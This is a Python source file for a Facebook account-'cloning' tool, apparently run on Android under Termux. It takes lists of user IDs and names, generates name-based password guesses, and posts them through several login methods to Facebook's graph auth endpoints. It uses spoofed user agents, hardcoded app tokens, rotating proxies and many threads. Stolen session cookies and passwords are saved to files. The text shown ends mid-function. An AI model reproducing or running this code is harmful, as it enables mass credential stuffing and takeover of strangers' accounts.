   strvoppo1 = f"Mozilla/5.0 (Linux; Android {str(rr(1,11))}; {str(rc(oppo))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,107))}.0.{str(rr(111,6666))}.{str(rr(10,400))} Mobile Safari/537.36"
   strvinfinix = f"Mozilla/5.0 (Linux; Android {str(rr(1,11))}; Infinix {str(rc(infinix))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,107))}.0.{str(rr(111,6666))}.{str(rr(10,400))} Mobile Safari/537.36"
   strvsamsung = f"Mozilla/5.0 (Linux; Android {str(rr(1,11))}; {str(rc(samsung))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,107))}.0.{str(rr(111,6666))}.{str(rr(10,400))} Mobile Safari/537.36"
   strvredmi1 = f"Mozilla/5.0 (Linux; Android {str(rr(1,11))}; {str(rc(redmi))} Build/{str(rc(lonte))}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(10,107))}.0.{str(rr(111,6666))}.{str(rr(10,400))} UCBrowser/{str(rr(1,20))}.{str(rr(1,10))}.0.{str(rr(111,5555))} Mobile Safari/537.36 OPR/{str(rr(10,80))}.{str(rr(1,10))}.{str(rr(111,5555))}.{str(rr(111,99999))}"
   strvnokiax = f"Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/{str(rc(build_nokiax))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(100,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 NokiaBrowser/7.{str(rr(1,5))}.1.{str(rr(16,37))} {str(rc(aZ))}{str(rr(1,1000))}"
   strvgt = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; {str(rc(gt))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(100,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 {str(rc(aZ))}{str(rr(1,1000))}"
  
   ugen.append(strvoppo)
   ugen.append(strvredmi)
   ugen.append(strvoppo1)
   ugen.append(strvinfinix)
   ugen.append(strvsamsung)
   ugen.append(strvredmi1)
   ugen.append(strvnokiax)
   ugen.append(strvgt)
   
for op in range(1000):
	rr = random.randint
	rc = random.choice
	bahasa = random.choice(["en","fr","ru","tr","id","pt","es","en-GB"])
	ua1 = f"Opera/9.80 (BlackBerry; Opera Mini/8.0.{str(rr(35000, 39000))}/{str(rr(190, 199))}.{str(rr(270, 290))}; U; {bahasa}) Presto/2.{str(rr(4, 20))}.{str(rr(420, 490))} Version/12.16"
	ua2 = f"SAMSUNG-GT-S3802 Opera/9.80 (J2ME/MIDP; Opera Mini/7.1.{str(rr(35000, 39000))}/{str(rr(190, 199))}.{str(rr(270, 290))}; U; {bahasa}) Presto/2.{str(rr(4, 20))}.{str(rr(420, 490))} Version/12.16"
	ua3 = f"Opera/9.80 (iPhone; Opera Mini/16.0.{str(rr(35000, 39000))}/{str(rr(190, 199))}.{str(rr(270, 290))}; U; {bahasa}) Presto/2.{str(rr(4, 20))}.{str(rr(420, 490))} Version/12.16"
	ua4 = f"Opera/9.80 (Android; Opera Mini/11.0.{str(rr(35000, 39000))}/{str(rr(190, 199))}.{str(rr(270, 290))}; U; {bahasa}) Presto/2.{str(rr(4, 20))}.{str(rr(420, 490))} Version/12.16"
	ua5 = f"Opera/9.80 (Windows Mobile; Opera Mini/5.1.{str(rr(35000, 39000))}/{str(rr(190, 199))}.{str(rr(270, 290))}; U; {bahasa}) Presto/2.{str(rr(4, 20))}.{str(rr(420, 490))} Version/12.16"
	ugen.append(ua1)
	ugen.append(ua2)
	ugen.append(ua3)
	ugen.append(ua4)
	ugen.append(ua5)
	
#--------[ Kontol-Fiixc4You ]----------#
for generate in range(100):
	a=random.randrange(1, 9)
	b=random.randrange(1, 9)
	c=random.randrange(7, 13)
	c=random.randrange(73,100)
	d=random.randrange(4200,4900)
	e=random.randrange(40,150)
	uaku=f'Mozilla/5.0 (Linux; Android {a}.{b}; Pixel {b}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
	ugen.append(uaku)
    
#------------->> INTERNET CHECK >>-------------#
def check_internet():
    try:
        requests.get('https://www.google.com', timeout=10)
        return True
    except:
        return False

def wait_for_internet():
    while not check_internet():
        #print(f'\r\r\x1b[1;90m[\x1b[38;5;214mNO INTERNET\x1b[1;90m]\x1b[38;5;214m Waiting for internet connection...', end='')
        time.sleep(5)
    #print(f'\r\r\x1b[1;90m[\033[1;32mINTERNET OK\x1b[1;90m]\033[1;32m Connection restored!')
    
#------------------[ WEB ]-----------------#
fbks = ('com.facebook.adsmanager', 'com.facebook.lite', 'com.facebook.orca', 'com.facebook.katana', 'com.facebook.mlite')
#------------------[ INSTALL ]-----------------#
os.system('pkg install sox -y')
os.system('pkg install espeak')
os.system('clear');os.system('espeak -a 300 "well,come to,The, WORLD,  OF,  MYSTERY"')
#------------------[ PROXY ]-----------------#
proxylist = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
open('socksku.txt', 'w').write(proxylist)
proxsi = open('socksku.txt', 'r').read().splitlines()
#------------------[ DATE-CHECKER ]-----------------#
def tutulx(fx):
    if len(fx) == 15:
        if fx[:10] in ['1000000000']:
            tutulxz = '2009'
            return tutulxz
        if fx[:9] in ['100000000']:
            tutulxz = '2009'
            return tutulxz
        if fx[:8] in ['10000000']:
            tutulxz = '2009'
            return tutulxz
        if fx[:7] in ['1000000', '1000001', '1000002', '1000003', '1000004', '1000005']:
            tutulxz = '2009'
            return tutulxz
        if fx[:7] in ['1000006', '1000007', '1000008', '1000009']:
            tutulxz = '2010'
            return tutulxz
        if fx[:6] in ['100001']:
            tutulxz = '2010/2011'
            return tutulxz
        if fx[:6] in ['100002', '100003']:
            tutulxz = '2011/2012'
            return tutulxz
        if fx[:6] in ['100004']:
            tutulxz = '2012/2013'
            return tutulxz
        if fx[:6] in ['100005', '100006']:
            tutulxz = '2013/2014'
            return tutulxz
        if fx[:6] in ['100007', '100008']:
            tutulxz = '2014/2015'
            return tutulxz
        if fx[:6] in ['100009']:
            tutulxz = '2015'
            return tutulxz
        if fx[:5] in ['10001']:
            tutulxz = '2015/2016'
            return tutulxz
        if fx[:5] in ['10002']:
            tutulxz = '2016/2017'
            return tutulxz
        if fx[:5] in ['10003']:
            tutulxz = '2018/2019'
            return tutulxz
        if fx[:5] in ['10004']:
            tutulxz = '2019'
            return tutulxz
        if fx[:5] in ['10005']:
            tutulxz = '2020'
            return tutulxz
        if fx[:5] in ['10006', '10007', '10008']:
            tutulxz = '2021/2022'
            return tutulxz
        tutulxz = '2023'
        return tutulxz
    if len(fx) in [9, 10]:
        tutulxz = '2008/2009'
        return tutulxz
    if len(fx) == 8:
        tutulxz = '2007/2008'
        return tutulxz
    if len(fx) == 7:
        tutulxz = '2006/2007'
        return tutulxz
    tutulxz = '2023/2024'
    return tutulxz

#------------->> SYS PRO >>-------------#
sys.stdout.write('\x1b]2; GEN-HUB\x07')
#------------------[ COLOR ]-----------------#
B = '\x1b[10;90m';R = '\x1b[10;91m';G = '\x1b[10;92m';H = '\x1b[10;93m';BL = '\x1b[10;94m';BG = '\x1b[10;95m';S = '\x1b[10;96m';W = '\x1b[10;97m';EX = '\x1b[0m';E = '\x1b[m'
#------------------[ SYTLE ]-----------------#
dt = '•'
#------------->> COLOUR >>-------------#
gx="\033[1;32m";wx="\x1b[1;97m";rx="\x1b[38;5;160m";cx="\x1b[1;96m";yx="\x1b[1;93m";bx='\x1b[1;90m'
#------------->> STYLE >>-------------#
xd=f"{bx}[{wx}~{bx}]{gx}";xd1=f"{bx}[{wx}1{bx}]{gx}";xd2=f"{bx}[{wx}2{bx}]{gx}";xd3=f"{bx}[{wx}3{bx}]{gx}";xd4=f"{bx}[{wx}4{bx}]{gx}";xd5=f"{bx}[{wx}5{bx}]{gx}";xd6=f"{bx}[{wx}6{bx}]{gx}";xd7=f"{bx}[{wx}7{bx}]{gx}";xd8=f"{bx}[{wx}8{bx}]{gx}";xd9=f"{bx}[{wx}9{bx}]{gx}";xd10=f"{bx}[{wx}10{bx}]{gx}";xd11=f"{bx}[{wx}11{bx}]{gx}";xd12=f"{bx}[{wx}12{bx}]{gx}";xd13=f"{bx}[{wx}13{bx}]{gx}";xd14=f"{bx}[{wx}14{bx}]{gx}";xd15=f"{bx}[{wx}15{bx}]{gx}";xd0=f"{bx}[{wx}0{bx}]{gx}";xdx=f"{bx}[{wx}?{bx}]{gx}"
#------------->> LOGO >>-------------#
os.system('xdg-open https://chat.whatsapp.com/F3IhtLI7duf4pMkhhXJSfd?mode=ems_copy_t')
logo = f'''
    {gx}░██████╗{wx}░███████╗{gx}███╗░░██╗
    {gx}██╔════╝{wx}░██╔════╝{gx}████╗░██║ {bx}|{gx} OWNER{bx}:{gx} MYSTERY
    {gx}██║░░██╗{wx}░█████╗{gx}░░██╔██╗██║
    {gx}██║░░╚██╗{wx}██╔══╝{gx}░░██║╚████║ {bx}|{gx} STATUS   {bx}:{rx}PAID
    {gx}╚██████╔╝{wx}███████╗{gx}██║░╚███║
    {gx}░╚═════╝{wx}░╚══════╝{gx}╚═╝░░╚══╝ {bx}|{gx} VERSION  {bx}:{wx} 0.8
{wx}{47*'-'}
       {gx}TOOLS {bx}|{wx}FILE{bx}|{wx}RANDOM{bx}|{wx}OLD{bx}| {gx}CLONE
{wx}{47*'-'}'''
#------------->> CLEAR PRO >>-------------#
def clear():os.system('clear');print(logo)
def linex():print(f"{wx}{47*'-'}")

#------------->> MAIN MENU >>-------------#
def Menu():
    clear();print(f'{xd1} START FILE CLONING ');print(f'{xd2} START RANDOM {wx}ALL{gx} COUNTRY CLONING ');print(f'{xd3} START OLD CLONING ');print(f'{xd0} EXIT ALL CLONING ');linex();___O_P___ = input(f'{xdx} SELECTION {bx}:{wx} ')
    if ___O_P___ in ['1']:____F_I_L_E____()
    elif ___O_P___ in ['2']:____R_A_N_D_O_M____()
    elif ___O_P___ in ['3']:____O_L_D____()
    elif ___O_P___ in ['0']:exit()
    else:linex();print(f'{xd}{rx} WRONG OPTION SELECTION ');time.sleep(3);Menu()

#------------->> FILE MAIN MENU >>-------------#
def ____F_I_L_E____():
    clear();print(f'{xd} EXAMPLE {bx}:{gx} /sdcard/filename.txt ');linex();filepro = input(f'{xd} ENTER FILE NAME {bx}:{wx} ')
    try:
          fo = open(filepro,'r').read().splitlines()
    except FileNotFoundError:linex();print(f'{xd}{rx} FILE NOT FOUND ');time.sleep(3);____F_I_L_E____()
    
    # Password selection menu for file cloning
    clear()
    print(f'{xd1} AUTO PASS 1 {wx}({gx}Recommended{wx})')
    print(f'{xd2} AUTO PASS 2 {wx}({gx}Alternative{wx})')
    print(f'{xd3} CUSTOM PASS {wx}({gx}Manual Entry{wx})')
    linex()
    pass_option = input(f'{xdx} SELECT PASSWORD OPTION {bx}:{wx} ')
    
    if pass_option in ['1']:
        # Auto Pass 1 - Common passwords with name variations
        plist.extend(['firstlast', 'first123', 'first1234', 'first12345', 'first@123', 'first@1234', 
                     'Firstlast', 'First123', 'First1234', 'First12345', 'First@123', 'First@1234',
                     'first', 'last', 'firstlast', 'first1', 'first12', 'last123', 'first last', 'last first'])
    elif pass_option in ['2']:
        # Auto Pass 2 - More variations
        plist.extend(['first', 'last', 'firstlast', 'first1', 'first12', 'first123', 'first1234',
                     'last1', 'last12', 'last123', 'first last', 'last first', 'Firstlast1234',
                     'first080', 'first081', 'first090', 'first070', 'first1212', 'first1122',
                     'lastfirst', 'First Last', 'FirstLast', 'first001', 'firstlast001',
                     'firstlast123', 'firstlast1234', 'firstlast@123', 'Firstlast123', 
                     'First', 'Last', 'Firstlast', 'First1', 'First12', 'First123', 'First1234',
                     'first@123', 'first@1234', 'First@123', 'First@1234', 'first@', 'first123456',
                     'name', 'Name', 'name123', 'Name123', 'name1234', 'Name1234'])
    elif pass_option in ['3']:
        # Custom Pass - Manual entry
        clear()
        print(f'{xd} EXAMPLE {bx}:{gx} firstlast {bx}|{gx} first123 {bx}|{gx} first@@ ')
        linex()
        try:
            ps_limit = int(input(f'{xdx} HOW MANY PASSWORDS TO ADD {bx}:{wx} '))
        except:
            ps_limit = 5
        clear()
        for i in range(ps_limit):
            plist.append(input(f'{xd} ENTER PASSWORD NO {wx}{i+1} {bx}:{wx} '))
    else:
        linex();print(f'{xd}{rx} WRONG OPTION SELECTION ');time.sleep(3);____F_I_L_E____()
        return
    
    clear()
    print(f'{xd1} METHOD {wx}~{gx} M1');print(f'{xd2} METHOD {wx}~{gx} M2');print(f'{xd3} METHOD {wx}~{gx} M3')
    print(f'{xd4} METHOD {wx}~{gx} M4');print(f'{xd5} METHOD {wx}~{gx} M5');print(f'{xd6} METHOD {wx}~{gx} M6')
    print(f'{xd7} METHOD {wx}~{gx} M7')
    linex();___M_E_T_H_O_D___ = input(f'{xd} ENTER METHOD {bx}:{wx} ')
    
    clear();___C_P___ = input(f'{xd} DO YOU WANT SHOW CP UID {bx}:{wx} {wx}({gx}y{bx}/{rx}n{wx}) ')
    if ___C_P___ in ['y','Y','yes','Yes','1']:pcp.append('y')
    else:pcp.append('n')
    clear();___C_O_O_K_I_E_S___ = input(f'{xd} DO YOU WANT SHOW COOKIES {bx}:{wx} {wx}({gx}y{bx}/{rx}n{wx}) ')
    if ___C_O_O_K_I_E_S___ in ['y','Y','yes','Yes','1']:show_cookies.append('y')
    else:show_cookies.append('n')
    with tred(max_workers=35) as ___H_U_B___:
            clear();total_ids = str(len(fo))
            print(f'{xd} TOTAL UID{bx}|{gx}METHOD {bx}:{wx} {total_ids}{bx}|{wx}M{___M_E_T_H_O_D___} ');print(f'{xd} TODAYS DATE   {wx}: {dateti} ');print(f'{xd} FLIGHT MODE {wx}ON{bx}|{wx}OFF{gx} EVERY {wx}2{gx} MINUTES ');linex()
            for user in fo:
                ids,names = user.split('|')
                passlist = plist
                if ___M_E_T_H_O_D___ in ['1']:___H_U_B___.submit(___M_T_H_D_1___,ids,names,passlist)
                elif ___M_E_T_H_O_D___ in ['2']:___H_U_B___.submit(___M_T_H_D_2___,ids,names,passlist)
                elif ___M_E_T_H_O_D___ in ['3']:___H_U_B___.submit(___M_T_H_D_3___,ids,names,passlist)
                elif ___M_E_T_H_O_D___ in ['4']:___H_U_B___.submit(___M_T_H_D_4___,ids,names,passlist)
                elif ___M_E_T_H_O_D___ in ['5']:___H_U_B___.submit(___M_T_H_D_5___,ids,names,passlist)
                elif ___M_E_T_H_O_D___ in ['6']:___H_U_B___.submit(___M_T_H_D_6___,ids,names,passlist)
                elif ___M_E_T_H_O_D___ in ['7']:___H_U_B___.submit(___M_T_H_D_7___,ids,names,passlist)
    print(f"\n{wx}{47*'-'}");print(f'{xd} THE PROCESS HAS COMPLETED');print(f"{xd} TOTAL OK IDS {bx}:{gx} {len(oks)}");print(f"{xd} TOTAL CP IDS {bx}:\x1b[38;5;205m {len(cps)}");print(f"{xd} TOTAL 2FA IDS {bx}:\x1b[38;5;214m {len(twf)}");print(f"{wx}{47*'-'}");exit()

#------------->> FILE METHOD M1 B-GRAPH >>-------------#
def ___M_T_H_D_1___(ids,names,passlist):
        try:
                global loop,oks,cps,twf
                if not check_internet():
                    wait_for_internet()
                xp=f"{bx}[{gx}MR{bx}]{gx}"
                sys.stdout.write(f'\r\r{xp}-\x1b[1;90m[\033[1;32mGEN\x1b[1;90m] \033[1;37m%s\x1b[1;90m|\033[1;37mOK:-\033[1;32m%s\x1b[1;90m|\033[1;37mCP:-\x1b[38;5;205m%s\x1b[1;90m|\033[1;37m2FA:-\x1b[38;5;214m%s '%(loop,len(oks),len(cps),len(twf)));sys.stdout.flush()
                ua = random.choice(ugen)
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
                        headers = {"Content-Type": "application/x-www-form-urlencoded","Host": "graph.facebook.com","User-Agent":ua,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "MOBILE.LTE","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
                        url = 'https://b-graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        uid = po['uid']
                                        year = tutulx(str(uid))
                                        print(f'\r\r\x1b[1;90m[\033[1;32mGEN-OK\x1b[1;90m]\033[1;32m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                                        if 'y' in show_cookies:
                                            print(f'\r\r\x1b[1;90m[\U0001F4A5\x1b[1;90m]\033[1;37m '+coki);print('')
                                        os.system('espeak -a 300 "GEN,  Ok,  id"')
                                        open('/sdcard/GEN-FILE-M1-OK-COOKIES.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                                        oks.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        uid = po['error']['error_data']['uid']
                                        if 'y' in pcp:
                                            year = tutulx(str(uid))
                                            print(f'\r\r\x1b[1;90m[\x1b[38;5;205mGEN-CP\x1b[1;90m]\x1b[38;5;205m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                                            os.system('espeak -a 300 "Cp"')
                                        open('/sdcard/GEN-FILE-M1-CP.txt','a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                        else:continue
                loop+=1
        except Exception as e:pass

#------------->> FILE METHOD M2 GRAPH >>-------------#
def ___M_T_H_D_2___(ids,names,passlist):
        try:
                global loop,oks,cps,twf
                if not check_internet():
                    pwait_for_internet()
                xp=f"{bx}[{gx}MR{bx}]{gx}"
                sys.stdout.write(f'\r\r{xp}-\x1b[1;90m[\033[1;32mGEN\x1b[1;90m] \033[1;37m%s\x1b[1;90m|\033[1;37mOK:-\033[1;32m%s\x1b[1;90m|\033[1;37mCP:-\x1b[38;5;205m%s\x1b[1;90m|\033[1;37m2FA:-\x1b[38;5;214m%s '%(loop,len(oks),len(cps),len(twf)));sys.stdout.flush()
                ua = random.choice(ugen)
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        data = {"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email": ids,"password": pas,"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies": "1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_GB","client_country_code": "GB","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
                        headers = {'User-Agent': ua,'Content-Type': 'application/x-www-form-urlencoded','Host': 'graph.facebook.com','X-FB-Net-HNI': str(random.randint(20000, 40000)),'X-FB-SIM-HNI': str(random.randint(20000, 40000)),'X-FB-Connection-Type': 'MOBILE.LTE','X-Tigon-Is-Retry': 'False','x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62','x-fb-device-group': '5120','X-FB-Friendly-Name': 'ViewerReactionsMutation','X-FB-Request-Analytics-Tags': 'graphservice','X-FB-HTTP-Engine': 'Liger','X-FB-Client-IP': 'True','X-FB-Server-Cluster': 'True','x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                        url = 'https://graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        uid = po['uid']
                                        year = tutulx(str(uid))
                                        print(f'\r\r\x1b[1;90m[\033[1;32mGEN-OK\x1b[1;90m]\033[1;32m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                                        if 'y' in show_cookies:
                                            print(f'\r\r\x1b[1;90m[\U0001F4A5\x1b[1;90m]\033[1;37m '+coki);print('')
                                        os.system('espeak -a 300 "GEN,  Ok,  id"')
                                        open('/sdcard/GEN-FILE-M2-OK-COOKIES.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                                        oks.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        uid = po['error']['error_data']['uid']
                                        if 'y' in pcp:
                                            year = tutulx(str(uid))
                                            print(f'\r\r\x1b[1;90m[\x1b[38;5;205mGEN-CP\x1b[1;90m]\x1b[38;5;205m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                                            os.system('espeak -a 300 "Cp"')
                                        open('/sdcard/GEN-FILE-M2-CP.txt','a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                        else:continue
                loop+=1
        except Exception as e:pass

#------------->> FILE METHOD M3 B-GRAPH (mini) >>-------------#
def ___M_T_H_D_3___(ids,names,passlist):
        try:
                global loop,oks,cps,twf
                if not check_internet():
                    wpait_for_internet()
                xp=f"{bx}[{gx}MR{bx}]{gx}"
                sys.stdout.write(f'\r\r{xp}-\x1b[1;90m[\033[1;32mGEN\x1b[1;90m] \033[1;37m%s\x1b[1;90m|\033[1;37mOK:-\033[1;32m%s\x1b[1;90m|\033[1;37mCP:-\x1b[38;5;205m%s\x1b[1;90m|\033[1;37m2FA:-\x1b[38;5;214m%s '%(loop,len(oks),len(cps),len(twf)));sys.stdout.flush()
                ua = random.choice(ugen)
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        data = {"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"email": ids,"password": pas,"generate_analytics_claims": "1","credentials_type": "password","source": "login","error_detail_type": "button_with_disabled","enroll_misauth": "false","generate_session_cookies": "1","generate_machine_id": "1","fb_api_req_friendly_name": "authenticate",}
                        headers = {"Accept-Encoding": "gzip, deflate","Accept": "*/*","Connection": "keep-alive","User-Agent": ua,"Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32","X-FB-Friendly-Name": "authenticate","X-FB-Connection-Type": "unknown","Content-Type": "application/x-www-form-urlencoded","X-FB-HTTP-Engine": "Liger","Content-Length": "329",}
                        url = 'https://b-graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        uid = po['uid']
                                        year = tutulx(str(uid))
                                        print(f'\r\r\x1b[1;90m[\033[1;32mGEN-OK\x1b[1;90m]\033[1;32m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                                        if 'y' in show_cookies:
                                            print(f'\r\r\x1b[1;90m[\U0001F4A5\x1b[1;90m]\033[1;37m '+coki);print('')
                                        os.system('espeak -a 300 "GEN,  Ok,  id"')
                                        open('/sdcard/GEN-FILE-M3-OK-COOKIES.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                                        oks.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        uid = po['error']['error_data']['uid']
                                        if 'y' in pcp:
                                            year = tutulx(str(uid))
                                            print(f'\r\r\x1b[1;90m[\x1b[38;5;205mGEN-CP\x1b[1;90m]\x1b[38;5;205m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                                            os.system('espeak -a 300 "Cp"')
                                        open('/sdcard/GEN-FILE-M3-CP.txt','a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                        else:continue
                loop+=1
        except Exception as e:pass

#------------->> FILE METHOD M4 GRAPH (mini) >>-------------#
def ___M_T_H_D_4___(ids,names,passlist):
        try:
                global loop,oks,cps,twf
                if not check_internet():
                    wait_for_internet()
                xp=f"{bx}[{gx}MR{bx}]{gx}"
                sys.stdout.write(f'\r\r{xp}-\x1b[1;90m[\033[1;32mGEN\x1b[1;90m] \033[1;37m%s\x1b[1;90m|\033[1;37mOK:-\033[1;32m%s\x1b[1;90m|\033[1;37mCP:-\x1b[38;5;205m%s\x1b[1;90m|\033[1;37m2FA:-\x1b[38;5;214m%s '%(loop,len(oks),len(cps),len(twf)));sys.stdout.flush()
                ua = random.choice(ugen)
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        data = {"access_token": "6628568379|c1e620fa708a1d5696fb991c1bde5662","sdk_version": {random.randint(1,26)}, "email": ids,"password": pas,"sdk": "android","locale": "en_US","generate_session_cookies": "1","sig": "c1e620fa708a1d5696fb991c1bde5662"}
                        headers = {"Host": "graph.facebook.com","x-fb-connection-bandwidth": str(random.randint(20000000, 30000000)),"x-fb-sim-hni": str(random.randint(20000, 40000)),"x-fb-net-hni": str(random.randint(20000, 40000)),"x-fb-connection-quality": "EXCELLENT","user-agent":ua,"content-type": "application/x-www-form-urlencoded","x-fb-http-engine": "Liger"}
                        url = 'https://graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        uid = po['uid']
                                        year = tutulx(str(uid))
                                        print(f'\r\r\x1b[1;90m[\033[1;32mGEN-OK\x1b[1;90m]\033[1;32m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                                        if 'y' in show_cookies:
                                            print(f'\r\r\x1b[1;90m[\U0001F4A5\x1b[1;90m]\033[1;37m '+coki);print('')
                                        os.system('espeak -a 300 "GEN,  Ok,  id"')
                                        open('/sdcard/GEN-FILE-M4-OK-COOKIES.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                                        oks.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        uid = po['error']['error_data']['uid']
                                        if 'y' in pcp:
                                            year = tutulx(str(uid))
                                            print(f'\r\r\x1b[1;90m[\x1b[38;5;205mGEN-CP\x1b[1;90m]\x1b[38;5;205m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                                            os.system('espeak -a 300 "Cp"')
                                        open('/sdcard/GEN-FILE-M4-CP.txt','a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                        else:continue
                loop+=1
        except Exception as e:pass

#------------->> FILE METHOD M5 HOST >>-------------#
def ___M_T_H_D_5___(ids,names,passlist):
    global loop,oks,cps,twf
    if not check_internet():
        wait_for_internet()
    xp=f"{bx}[{gx}MR{bx}]{gx}"
    sys.stdout.write(f'\r\r{xp}-\x1b[1;90m[\033[1;32mGEN\x1b[1;90m] \033[1;37m%s\x1b[1;90m|\033[1;37mOK:-\033[1;32m%s\x1b[1;90m|\033[1;37mCP:-\x1b[38;5;205m%s\x1b[1;90m|\033[1;37m2FA:-\x1b[38;5;214m%s '%(loop,len(oks),len(cps),len(twf)));sys.stdout.flush()
    session = requests.Session()
    ua = random.choice(ugen)
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'Ahmed'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
            ua = generate_wv_ua()
            __u_r_l__ = session.get(f'https://touch.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8').text
